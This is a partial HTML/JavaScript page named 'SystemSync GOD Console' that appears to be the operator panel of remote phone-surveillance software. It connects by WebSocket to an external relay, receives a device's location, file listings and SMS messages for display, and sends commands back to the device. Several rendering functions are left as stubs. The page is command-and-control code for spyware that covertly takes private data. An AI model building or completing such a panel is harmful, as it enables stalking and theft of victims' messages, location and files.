<!DOCTYPE html>
<html>
<head>
    <title>SystemSync GOD Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* (your existing CSS) */
    </style>
</head>
<body>
<!-- (your existing HTML layout) -->

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    const ws = new WebSocket("wss://mirror-view.onrender.com");
    let mapInstance = null;

    ws.onopen = () => {
        ws.send("I_AM_WEB");
        setStatus("ONLINE");
    };

    ws.onclose = () => setStatus("OFFLINE");

    ws.onmessage = (e) => {
        const msg = e.data;
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
        } else if (msg.startsWith("LOC_DATA:")) {
            renderMap(JSON.parse(msg.substring(9)));
        } else if (msg.startsWith("FILE_LIST:")) {
            renderFiles(JSON.parse(msg.substring(10)));
        } else if (msg.startsWith("SMS_DATA:")) {
            renderLogs(JSON.parse(msg.substring(9)));
        }
    };

    function send(cmd) { ws.send(cmd); }

    function setStatus(text) {
        document.getElementById("status").innerText = text;
        // update colors...
    }

    function renderMap(data) { /* ... */ }
    function renderFiles(files) { /* ... */ }
    function renderLogs(data) { /* ... */ }
</script>
</body>
</html>
